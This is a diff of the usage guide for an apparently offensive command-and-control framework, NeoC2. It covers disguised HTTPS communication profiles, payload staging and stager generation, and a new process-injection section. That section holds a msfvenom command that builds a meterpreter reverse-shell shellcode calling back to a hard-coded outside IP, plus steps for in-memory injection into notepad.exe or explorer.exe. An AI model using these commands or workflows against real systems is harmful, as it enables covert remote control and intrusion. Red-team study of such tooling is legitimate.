@@ -1,20 +1,168 @@
 # GENERAL USAGE GUIDE
 
 ## Table of Contents
+- [Profiles](#profiles)
+- [Listener Management](#listener-management)
+- [Payload Generation](#payload-generation)
+- [Payload Staging](#payload-staging)
 - [Agent Management](#agent-management)
 - [Interactive Mode](#interactive-mode)
-- [Payload Generation](#payload-generation)
-- [Listener Management](#listener-management)
 - [Modules and Post-Exploitation](#modules-and-post-exploitation)
 - [Evasion Techniques](#evasion-techniques)
 - [File Operations](#file-operations)
-- [Persistence Mechanisms](#persistence-mechanisms)
-- [Security Features](#security-features)
 - [Task Chaining](#task-chaining-web-ui-only)
 - [Task Management](#task-management)
-- [Profiles and Staging](#profiles-and-staging)
+- [Process Injection](#process-injection)
 - [Event Monitoring](#event-monitoring)
+- [Security Features](#security-features)
 - [Troubleshooting](#troubleshooting)
+
+
+## Profiles 
+
+Profiles define communication characteristics for agents:
+
+### Profile Structure
+
+```json
+{
+  "name": "my_https_profile",
+  "description": "Custom HTTPS communication profile",
+  "config": {
+    "endpoints": {
+      "download": "/api/assets/main.js",
+      "register": "/api/users/register",
+      "results": "/api/users/{agent_id}/activity",
+      "tasks": "/api/users/{agent_id}/profile",
+      "interactive": "/api/users/{agent_id}/settings",
+      "interactive_status": "/api/users/{agent_id}/status"
+    },
+    "headers": {
+      "Accept": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "heartbeat_interval": 60,
+    "http_get": {
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      },
+      "uri": "/api/v1/info"
+    },
+    "http_post": {
+      "headers": {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      },
+      "uri": "/api/v1/submit"
+    },
+    "jitter": 0.2,
+    "protocol": "https",
+    "sleep_time": 60,
+    "p2p_enabled": false,
+    "p2p_port": 8888,
+    "kill_date": "2025-12-31T23:59:59Z",
+    "working_hours": {
+      "start_hour": 9,
+      "end_hour": 17,
+      "timezone": "UTC",
+      "days": [1, 2, 3, 4, 5]
+    }
+  }
+}
+
+```
+ 
+ ### Load Profile to DB
+ 
+```bash
+profile add <config path>
+# Register profile routes 
+listener create <listener_name> https <port> <ip> profile_name=<profile_name>
+```
+
+### Kill Date Configuration
+
+- **Field**: `kill_date`
+- **Format**: ISO 8601 format in UTC timezone (`YYYY-MM-DDTHH:MM:SSZ`)
+- **Example**: `"2025-12-31T23:59:59Z"`
+- **Default**: If not specified, defaults to `"2025-12-31T23:59:59Z"`
+- **Behavior**: When the agent's system time exceeds this date/time, the agent will self-delete
+
+### Working Hours Configuration
+
+- **Field**: `working_hours`
+- **Structure**:
+  - `start_hour`: Start of working hours (0-23 in 24-hour format)
+  - `end_hour`: End of working hours (0-23 in 24-hour format)
+  - `timezone`: Timezone for working hours (currently only UTC is properly handled in the agent)
+  - `days`: Array of days when working hours apply (1=Monday, 2=Tuesday, 3=Wednesday, 4=Thursday, 5=Friday, 6=Saturday, 7=Sunday)
+
+**Example**:
+```json
+"working_hours": {
+  "start_hour": 9,      // 9 AM
+  "end_hour": 17,       // 5 PM
+  "timezone": "UTC",    // Timezone
+  "days": [1, 2, 3, 4, 5]  // Monday to Friday
+}
+```
+
+1. Both kill date and working hours are embedded into the agent binary during generation and are not dynamically updated from the server during runtime.
+2. Changes to the profile after agent deployment will NOT affect already deployed agents.
+3. The agent currently handles UTC properly, but other timezones are primarily handled as local time.
+4. Days are numbered from 1-7 (Monday=1, Sunday=7), with Sunday represented as both 0 (Go's default) and 7 (in configuration).
+5. Hours are specified in 24-hour format (0-23).
+
+
+## Listener Management
+
+HTTP listeners run as separate processes from the main Flask application, acting as internal redirectors, forwarding traffic from agents to the main web interface. Listeners in NeoC2 are profile-driven: they use predefined communication profiles. 
+
+### Listener Commands
+
+```
+listener create <name> <type> <port> [profile_name=<profile>]
+listener list
+listener start <name>
+listener stop <name>
+listener delete <name>
+```
+
+### Profile Integration
+
+When creating a listener, you associate it with a communication profile:
+```
+listener create my_http_listener type=http port=443 profile_name=stealth_crawler
+```
+
+
+## Payload Generation
+
+See Agents & Stager Guide (on the sidebar) for complete agent type breakdown and usage:
+
+## Payload Staging
+
+NeoC2 supports staging payloads directly through the `payload_upload` base-command of the remote client server, allowing operators to deploy binary executables like .exe, .dll, or other file types in addition to Python scripts.
+
+### Capabilities
+- **Multi-Format Support**: Upload EXE, DLL, PY, JS, VBS, BAT, PS1, and other binary/script files
+- **Encryption**: XOR encryption using SECRET_KEY environment variable with Base64 encoding
+- **Automatic Serving**: Uploaded payloads automatically available at `/api/assets/main.js`
+- **Intelligent Execution**: Droppers automatically detect payload type and handle appropriately
+- **Maximum Size**: Supports payloads up to 50MB
+- **Overwrite Functionality**: New uploads replace previous payloads
+
+#### Example Usage:
+```
+NeocC2 > payload_upload <options>
+# Then deploy droppers 
+NeoC2 > stager generate linux_binary host=<c2_host> port=<c2_port> protocol=https
+```
+
+
 
 ## Agent Management
 
@@ -95,72 +243,6 @@ NeoC2 [INTERACTIVE:abc123] >  kill
 Start a netcat listener in another terminal and send the command below to the agent. This upgrades interaction with an agent from a task-based interactive mode to a complete TTY Shell
 ```
 NeoC2 > tty_shell <ip> <port> # default port is 5000
-```
-
-## Payload Generation
-
-NeoC2 supports multiple payload types with advanced polymorphism:
-
-### Polymorphism Engine
-
-Enable Obfuscation when building a Python Full Agent for the Polymorphic Engine:
-1. Variable/Function Name Randomization - Every generation uses unique identifiers
-2. String Obfuscation - 5 different encoding techniques (base64, hex, char arrays, reverse, split)
-3. Dead Code Injection - Benign junk code that varies each time
-4. Import Shuffling - Randomized import order
-5. Code Structure Variation - Different layouts, same functionality
-
-### Stager Generation
-Generated stagers download payloads from `/api/assets/main.js` Chain this with `payload_upload` BASE-COMMAND
-```
-stager generate <type> host=<host> port=<port> protocol=<protocol>
-```
-
-Example:
-```
-NeoC2 > stager generate bash host=0.0.0.0 port=443 protocol=https
-NeoC2 > stager generate powershell host=0.0.0.0 port=443 protocol=https
-```
-
-### Payload Upload Feature
-
-NeoC2 supports uploading custom payloads directly through the remote cli:
-
-#### Uploading Payloads
-1. Select any payload file (EXE, DLL, PY, JS, etc.) up to 50MB
-2. The payload is automatically XOR encrypted using the SECRET_KEY environment variable
-3. The encrypted payload is Base64 encoded and made available at `/api/assets/main.js`
-
-```
-NeoC2 > payload_upload <options> 
-```
-
-#### Supported Payload Types
-- **Python scripts**: Executed in-memory by droppers (stealthy)
-- **Windows executables (.exe)**: Written to temp directory, executed, and cleaned up
-- **Dynamic link libraries (.dll)**: Can be loaded by appropriate loaders
-- **Other binary files**: Handled according to file type detection
-
-
-## Listener Management
-
-HTTP listeners run as separate processes from the main Flask application, acting as internal redirectors, forwarding traffic from agents to the main web interface. Listeners in NeoC2 are profile-driven: they use predefined communication profiles. 
-
-### Listener Commands
-
-```
-listener create <name> <type> <port> [profile_name=<profile>]
-listener list
-listener start <name>
-listener stop <name>
-listener delete <name>
-```
-
-### Profile Integration
-
-When creating a listener, you associate it with a communication profile:
-```
-listener create my_http_listener type=http port=443 profile_name=stealth_crawler
 ```
 
 ## Modules and Post-Exploitation
@@ -253,87 +335,6 @@ save <task_id>
 save 2
 download logs/task_2_20251128_224240.txt
 ```
-
-## Persistence Mechanisms
-
-NeoC2 supports multiple persistence methods across platforms:
-
-### Windows Persistence
-
-1. **Registry Keys**: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-2. **Scheduled Tasks**: Using schtasks utility
-3. **WMI Events**: Permanent event subscriptions
-4. **Service Creation**: Installing as Windows service
-5. **Startup Folder**: Adding to user startup directory
-
-### Linux Persistence
-
-1. **Cron Jobs**: Scheduled execution via crontab
-2. **Systemd Services**: Persistent service configuration
-3. **Init Scripts**: Traditional SysV init scripts
-4. **Bashrc Modification**: Adding to shell initialization
-5. **Library Preloading**: LD_PRELOAD technique
-
-### macOS Persistence
-
-1. **Launch Agents**: Property list files in ~/Library/LaunchAgents
-2. **Launch Daemons**: System-wide launch daemons
-3. **Login Items**: Applications that start at login
-4. **Cron Jobs**: Similar to Linux cron
-5. **Shell Profiles**: Modifying .bash_profile, .zshrc
-
-### Persistence Commands
-
-```
-run persistence agent_id=<id> method=<method> [options]
-```
-
-Example:
-```
-run persistence agent_id=abc12345 method=registry payload_path=C:\agent.exe name=WindowsUpdate
-```
-## Lateral Movements Module
-
-Module Features:
-- Multi-platform support: Works on Windows, Linux, and macOS systems
-- Multiple techniques: WMI, SMB, SSH, PsExec, RDP, DCOM, and WinRM
-- Flexible authentication: Supports credential-based and context-based movement
-- Configurable options: Target, technique, credentials, payload path, execution method, and timeout
-
-### Supported Techniques:
-1. WMI (Windows Management Instrumentation): Remote execution via WMI
-2. SMB (Server Message Block): File sharing and execution via network shares
-3. SSH (Secure Shell): Remote execution on Linux/Unix systems
-4. PsExec: Windows remote execution tool
-5. RDP (Remote Desktop Protocol): Drive redirection and session establishment
-6. DCOM (Distributed Component Object Model): Alternative remote execution
-7. WinRM (Windows Remote Management): PowerShell remoting
-
-## Security Features
-
-### Password Security
-
-- **Secure Hashing**: All passwords hashed using Werkzeug security functions
-- **Strong Requirements**: Support for complex password policies
-- **Default Credentials**: Stored as secure hashes, not plain text
-
-### Access Control
-
-NeoC2 implements role-based access control:
-
-1. **Admin Role**: Full access to all framework features
-2. **Operator Role**: Manage agents, execute modules, handle listeners
-3. **Viewer Role**: Read-only access to monitoring and reports
-
-### Session Security
-
-- **Secure Sessions**: Proper session management with authentication
-- **Session Timeout**: Automatic logout after inactivity
-- **Audit Logging**: Track all user actions and system events
-
-### Encrypted Comms
-
-Robust encrypted communication between agents and the C2 server using Fernet's AES-128-CBC, ensuring that only legitimate agents can register and communicate with the server, while all task and result data is encrypted in transit.
 
 ## Task Chaining
 
@@ -447,104 +448,44 @@ result <agent_id>
 result <agent_id> <task_id>
 ```
 
+## Process Injection
 
-## Profiles and Staging
+## Usage
+1. Generate compatible shellcode using msfvenom
+2. Use the module with a base64 encoded shellcode string
+3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe 
 
-Profiles define communication characteristics for agents:
-
-### Profile Structure
-
-```json
-{
-  "name": "my_https_profile",
-  "description": "Custom HTTPS communication profile",
-  "config": {
-    "endpoints": {
-      "download": "/api/assets/main.js",
-      "register": "/api/users/register",
-      "results": "/api/users/{agent_id}/activity",
-      "tasks": "/api/users/{agent_id}/profile",
-      "interactive": "/api/users/{agent_id}/settings",
-      "interactive_status": "/api/users/{agent_id}/status"
-    },
-    "headers": {
-      "Accept": "application/json",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    },
-    "heartbeat_interval": 60,
-    "http_get": {
-      "headers": {
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-      },
-      "uri": "/api/v1/info"
-    },
-    "http_post": {
-      "headers": {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-      },
-      "uri": "/api/v1/submit"
-    },
-    "jitter": 0.2,
-    "protocol": "https",
-    "sleep_time": 60,
-    "p2p_enabled": false,
-    "p2p_port": 8888,
-    "kill_date": "2025-12-31T23:59:59Z",
-    "working_hours": {
-      "start_hour": 9,
-      "end_hour": 17,
-      "timezone": "UTC",
-      "days": [1, 2, 3, 4, 5]
-    }
-  }
-}
+## msfvenom Command Syntax
+Generate shellcode with proper null byte avoidance and correct format:
 
 ```
- 
- ### Load Profile to DB
- 
-```bash
-profile add <config path>
-# Register profile routes 
-listener create <listener_name> https <port> <ip> profile_name=<profile_name>
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw -o shellcode.bin
+# Then base64 encode it before sending to the module
+base64 -w 0 shellcode.bin
+
+pinject <shellcode> [agent_id=<agent_id>] # METHOD - 1
+run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2
 ```
 
-### Kill Date Configuration
+## Notes
+- If notepad.exe is not running on the target system, the agent will fallback on explorer.exe
+- The shellcode must be in raw binary format (use `-f raw`)
 
-- **Field**: `kill_date`
-- **Format**: ISO 8601 format in UTC timezone (`YYYY-MM-DDTHH:MM:SSZ`)
-- **Example**: `"2025-12-31T23:59:59Z"`
-- **Default**: If not specified, defaults to `"2025-12-31T23:59:59Z"`
-- **Behavior**: When the agent's system time exceeds this date/time, the agent will self-delete
+## Process Injection Flow
+1. Find target process PID
+2. Open process with appropriate permissions
+3. Allocate memory in target process
+4. Write shellcode to allocated memory
+5. Change memory protection to executable
+6. Create remote thread to execute shellcode
+7. All operations performed in-memory without touching disk
 
-### Working Hours Configuration
+## Supported Payloads
+- windows/x64/meterpreter/reverse_tcp
+- windows/x64/shell_reverse_tcp
+- windows/x64/exec
+- Any custom raw shellcode
 
-- **Field**: `working_hours`
-- **Structure**:
-  - `start_hour`: Start of working hours (0-23 in 24-hour format)
-  - `end_hour`: End of working hours (0-23 in 24-hour format)
-  - `timezone`: Timezone for working hours (currently only UTC is properly handled in the agent)
-  - `days`: Array of days when working hours apply (1=Monday, 2=Tuesday, 3=Wednesday, 4=Thursday, 5=Friday, 6=Saturday, 7=Sunday)
-
-**Example**:
-```json
-"working_hours": {
-  "start_hour": 9,      // 9 AM
-  "end_hour": 17,       // 5 PM
-  "timezone": "UTC",    // Timezone
-  "days": [1, 2, 3, 4, 5]  // Monday to Friday
-}
-```
-
-1. Both kill date and working hours are embedded into the agent binary during generation and are not dynamically updated from the server during runtime.
-2. Changes to the profile after agent deployment will NOT affect already deployed agents.
-3. The agent currently handles UTC properly, but other timezones are primarily handled as local time.
-4. Days are numbered from 1-7 (Monday=1, Sunday=7), with Sunday represented as both 0 (Go's default) and 7 (in configuration).
-5. Hours are specified in 24-hour format (0-23).
 
 ## Event Monitoring
 
@@ -556,6 +497,32 @@ event list
 event search
 event stats
 ```
+
+## Security Features
+
+### Password Security
+
+- **Secure Hashing**: All passwords hashed using Werkzeug security functions
+- **Strong Requirements**: Support for complex password policies
+- **Default Credentials**: Stored as secure hashes, not plain text
+
+### Access Control
+
+NeoC2 implements role-based access control:
+
+1. **Admin Role**: Full access to all framework features
+2. **Operator Role**: Manage agents, execute modules, handle listeners
+3. **Viewer Role**: Read-only access to monitoring and reports
+
+### Session Security
+
+- **Secure Sessions**: Proper session management with authentication
+- **Session Timeout**: Automatic logout after inactivity
+- **Audit Logging**: Track all user actions and system events
+
+### Encrypted Comms
+
+Robust encrypted communication between agents and the C2 server using Fernet's AES-128-CBC, ensuring that only legitimate agents can register and communicate with the server, while all task and result data is encrypted in transit.
 
 ## Troubleshooting
 
